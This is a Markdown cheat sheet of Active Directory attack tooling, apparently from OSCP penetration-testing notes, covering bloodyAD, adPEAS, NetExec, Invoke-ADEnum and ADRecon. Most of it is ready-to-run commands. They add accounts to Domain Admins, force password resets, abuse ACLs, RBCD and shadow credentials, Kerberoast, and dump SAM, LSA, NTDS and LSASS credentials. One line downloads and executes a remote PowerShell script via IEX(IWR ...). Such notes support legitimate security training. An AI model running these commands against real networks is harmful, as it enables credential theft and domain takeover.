# AD Enumeration Tools

## Table of Contents

- [bloodyAD](#bloodyad)
- [adPEAS](#adpeas)
- [NetExec (nxc)](#netexec-nxc)
- [Invoke-ADEnum](#invoke-adenum)
- [ADRecon](#adrecon)

---

## bloodyAD

> <https://github.com/CravateRouge/bloodyAD>

bloodyAD is a powerful Active Directory privilege escalation framework.

### Installation

```shell
pip install bloodyAD
# or
git clone https://github.com/CravateRouge/bloodyAD
cd bloodyAD && pip install .
```

### Basic Usage

```shell
# With password
bloodyAD -u $username -p '$password' -d $domain --host $rhost <command>

# With NTLM hash
bloodyAD -u $username -p ':$nthash' -d $domain --host $rhost <command>

# With Kerberos
export KRB5CCNAME=ticket.ccache
bloodyAD -u $username -d $domain --host $rhost -k <command>
```

### Enumeration

```shell
# Get domain info
bloodyAD -u $username -p '$password' -d $domain --host $rhost get info

# Get all users
bloodyAD -u $username -p '$password' -d $domain --host $rhost get users

# Get all computers
bloodyAD -u $username -p '$password' -d $domain --host $rhost get computers

# Get object attributes
bloodyAD -u $username -p '$password' -d $domain --host $rhost getObjectAttributes $target_user

# Get writable objects
bloodyAD -u $username -p '$password' -d $domain --host $rhost getObjectsInOU "DC=domain,DC=local" --writableOnly
```

### ACL Abuse

```shell
# Add user to group
bloodyAD -u $username -p '$password' -d $domain --host $rhost add groupMember "Domain Admins" $target_user

# Force password change (ForceChangePassword)
bloodyAD -u $username -p '$password' -d $domain --host $rhost set password $target_user 'NewPassword123!'

# Write owner
bloodyAD -u $username -p '$password' -d $domain --host $rhost set owner $target_object $username

# Add GenericAll
bloodyAD -u $username -p '$password' -d $domain --host $rhost add genericAll $target_object $username
```

### RBCD Attack

```shell
# Add RBCD
bloodyAD -u $username -p '$password' -d $domain --host $rhost add rbcd '$target_computer$' '$controlled_computer$'

# Remove RBCD
bloodyAD -u $username -p '$password' -d $domain --host $rhost del rbcd '$target_computer$' '$controlled_computer$'
```

### Shadow Credentials

```shell
# Add Shadow Credential
bloodyAD -u $username -p '$password' -d $domain --host $rhost add shadowCredentials $target

# Remove Shadow Credential
bloodyAD -u $username -p '$password' -d $domain --host $rhost del shadowCredentials $target
```

### Computer Account

```shell
# Add computer account
bloodyAD -u $username -p '$password' -d $domain --host $rhost add computer 'YOURPC$' 'Password123!'

# Get machine account quota
bloodyAD -u $username -p '$password' -d $domain --host $rhost getMAQ
```

---

## adPEAS

> <https://github.com/61106960/adPEAS>

PowerShell script for Active Directory enumeration.

### adPEAS Basic Usage

```powershell
# Import module
Import-Module .\adPEAS.ps1

# Run all checks
Invoke-adPEAS

# Output to file
Invoke-adPEAS -OutputPath C:\temp\adpeas_results
```

### Specific Modules

```powershell
# Domain enumeration
Invoke-adPEAS -Module Domain

# User enumeration
Invoke-adPEAS -Module User

# Computer enumeration
Invoke-adPEAS -Module Computer

# Kerberos attacks
Invoke-adPEAS -Module Kerberos

# Delegation issues
Invoke-adPEAS -Module Delegation

# ACL abuse
Invoke-adPEAS -Module ACL

# GPO abuse
Invoke-adPEAS -Module GPO

# Certificate attacks
Invoke-adPEAS -Module Certs
```

---

## NetExec (nxc)

> <https://github.com/Pennyw0rth/NetExec>

Modern network execution tool (formerly CrackMapExec).

### NetExec Installation

```shell
pip install netexec
# or
pipx install netexec
```

### Authentication

```shell
# Password
nxc smb $rhost -u $username -p '$password'

# NTLM hash
nxc smb $rhost -u $username -H $nthash

# Kerberos
nxc smb $rhost -u $username -p '$password' -k

# Multiple targets
nxc smb $cidr -u $username -p '$password'
```

### SMB Enumeration

```shell
# Enumerate shares
nxc smb $rhost -u $username -p '$password' --shares

# Spider shares
nxc smb $rhost -u $username -p '$password' --spider C$ --depth 2

# User enumeration
nxc smb $rhost -u $username -p '$password' --users

# Get password policy
nxc smb $rhost -u $username -p '$password' --pass-pol
```

### LDAP Enumeration

```shell
# General info
nxc ldap $rhost -u $username -p '$password'

# ASREPRoast
nxc ldap $rhost -u $username -p '$password' --asreproast output.txt

# Kerberoast
nxc ldap $rhost -u $username -p '$password' --kerberoast output.txt

# Get users with description
nxc ldap $rhost -u $username -p '$password' -M get-desc-users

# Find unconstrained delegation
nxc ldap $rhost -u $username -p '$password' --trusted-for-delegation

# AD CS enumeration
nxc ldap $rhost -u $username -p '$password' -M adcs
```

### Credential Dumping

```shell
# SAM dump
nxc smb $rhost -u $username -p '$password' --sam

# LSA secrets
nxc smb $rhost -u $username -p '$password' --lsa

# NTDS.dit (DCSync)
nxc smb $rhost -u $username -p '$password' --ntds

# LSASS dump
nxc smb $rhost -u $username -p '$password' -M lsassy
nxc smb $rhost -u $username -p '$password' -M nanodump
```

### Modules

```shell
# List modules
nxc smb -L
nxc ldap -L

# Petitpotam
nxc smb $rhost -u $username -p '$password' -M petitpotam

# WebDAV
nxc smb $rhost -u $username -p '$password' -M webdav

# Impersonate
nxc smb $rhost -u $username -p '$password' -M impersonate
```

---

## Invoke-ADEnum

> <https://github.com/Leo4j/Invoke-ADEnum>

### Invoke-ADEnum Usage

```powershell
IEX(IWR https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1 -UseBasicParsing)

# Run enumeration
Invoke-ADEnum

# Specific domain
Invoke-ADEnum -Domain $domain -Server $rhost
```

---

## ADRecon

> <https://github.com/adrecon/ADRecon>

### ADRecon Usage

```powershell
# Run full recon
.\ADRecon.ps1

# Output to specific folder
.\ADRecon.ps1 -OutputDir C:\temp\adrecon

# Generate Excel report
.\ADRecon.ps1 -GenExcel C:\temp\adrecon

# Specific domain
.\ADRecon.ps1 -DomainController $rhost -Credential (Get-Credential)
```

---

## Quick Reference

### Tool Selection

| Task | Best Tool |
| :--- | :--- |
| Quick enumeration | NetExec |
| ACL abuse | bloodyAD |
| Comprehensive scan | adPEAS |
| Report generation | ADRecon |
| Shadow Credentials | bloodyAD |
| RBCD attack | bloodyAD |

### Common Commands

```shell
# NetExec - Quick wins
nxc smb $rhost -u $username -p '$password' --shares --users

# bloodyAD - Password change
bloodyAD -u $user -p $pass -d $domain --host $rhost set password victim 'NewPass123!'

# bloodyAD - Add to group
bloodyAD -u $user -p $pass -d $domain --host $rhost add groupMember "Domain Admins" $victim
```

---

## See Also

- **[AD Exploitation](3.1.AD-Exploitation.md)** - Complete AD attack methodology
- **[Kerberos Attacks](3.3.Kerberos-Attacks.md)** - Kerberoasting, ASREPRoast
- **[NTLM Relay](3.4.NTLM-Relay-and-Responder.md)** - Responder and relay attacks
- **[Shadow Credentials](3.6.Shadow-Credentials.md)** - bloodyAD shadow credentials
- **[Kerberos Delegation](3.7.Kerberos-Delegation.md)** - Delegation attacks
- **[OSCP Exam Guide](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** - Exam methodology
